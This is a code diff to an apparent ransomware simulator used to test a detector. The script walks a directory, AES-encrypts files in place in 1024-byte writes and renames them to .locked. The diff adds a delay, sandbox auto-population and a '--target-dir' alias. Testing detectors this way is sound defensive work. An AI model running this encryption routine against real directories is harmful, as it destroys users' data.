@@ -44,7 +44,7 @@ def encrypt_bytes(data: bytes, key: bytes, iv: bytes) -> bytes:
     encryptor = cipher.encryptor()
     return encryptor.update(padded) + encryptor.finalize()
 
-def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: int = 120):
+def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: int = 120, delay: float = 0.04):
     sandbox = Path(sandbox_dir)
     if not sandbox.exists():
         print(f"[!] Sandbox directory {sandbox_dir} does not exist. Run setup_sandbox.py first.")
@@ -71,11 +71,26 @@ def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: i
     candidates = []
     for root, dirs, files in os.walk(sandbox):
         for fname in files:
-            if not fname.endswith(".locked") and not fname.endswith(".txt.note"):
+            if not fname.endswith(".locked") and not fname.endswith(".txt.note") and not fname.endswith(".txt"):
                 candidates.append(Path(root) / fname)
 
+    if not candidates:
+        print(f"  [*] No unencrypted files found in {sandbox_dir}. Auto-populating sandbox with 50 test files...")
+        try:
+            from workloads.setup_sandbox import setup_sandbox
+            setup_sandbox(sandbox_dir=str(sandbox), num_folders=5, files_per_folder=10)
+        except ImportError:
+            sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
+            from workloads.setup_sandbox import setup_sandbox
+            setup_sandbox(sandbox_dir=str(sandbox), num_folders=5, files_per_folder=10)
+
+        for root, dirs, files in os.walk(sandbox):
+            for fname in files:
+                if not fname.endswith(".locked") and not fname.endswith(".txt.note") and not fname.endswith(".txt"):
+                    candidates.append(Path(root) / fname)
+
     total_candidates = min(len(candidates), burst_target)
-    print(f"  [*] Step 2: Discovered {len(candidates)} files across multiple directories. Encrypting {total_candidates} files at maximum burst rate...")
+    print(f"  [*] Step 2: Discovered {len(candidates)} files across multiple directories. Encrypting {total_candidates} files at burst rate...")
 
     # Step 3: Rapid Encryption Loop (Triggers R1 High Write Rate & R2 Rename Rate)
     encrypted_count = 0
@@ -83,7 +98,7 @@ def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: i
 
     for file_path in candidates[:total_candidates]:
         try:
-            # A. Read initial header/sample using raw syscall (bypassing 128KB userspace prefetch)
+            # A. Read initial header/sample using raw syscall
             fd_in = os.open(file_path, os.O_RDONLY)
             header_bytes = os.read(fd_in, 512)
             os.close(fd_in)
@@ -93,8 +108,6 @@ def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: i
             ciphertext = encrypt_bytes(raw_payload, key, iv)
 
             # C. In-place overwrite with continuous 1024-byte bulk writes
-            # Using flush() ensures discrete kernel sys_enter_write syscalls
-            # yielding CWC (Continuous Write Count) >= 4 and Bulk Ratio = 1.0
             with open(file_path, "wb") as f_out:
                 chunk_sz = 1024
                 for off in range(0, len(ciphertext), chunk_sz):
@@ -110,6 +123,10 @@ def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: i
 
             encrypted_count += 1
             directories_touched.add(file_path.parent)
+            print(f"  -> Encrypting [{encrypted_count}/{total_candidates}]: {file_path.name} -> {locked_path.name}")
+
+            if delay > 0:
+                time.sleep(delay)
 
         except Exception as e:
             continue
@@ -143,8 +160,9 @@ def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: i
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
-    parser.add_argument("--sandbox", default="/tmp/ransomware_sandbox", help="Sandbox path")
+    parser.add_argument("--sandbox", "--target-dir", dest="sandbox", default="/tmp/ransomware_sandbox", help="Sandbox path")
     parser.add_argument("--count", type=int, default=120, help="Number of files to encrypt")
+    parser.add_argument("--delay", type=float, default=0.04, help="Inter-file delay in seconds (default: 0.04s for realistic attack demonstration)")
     args = parser.parse_args()
 
-    run_ransomware(args.sandbox, args.count)
+    run_ransomware(args.sandbox, args.count, delay=args.delay)
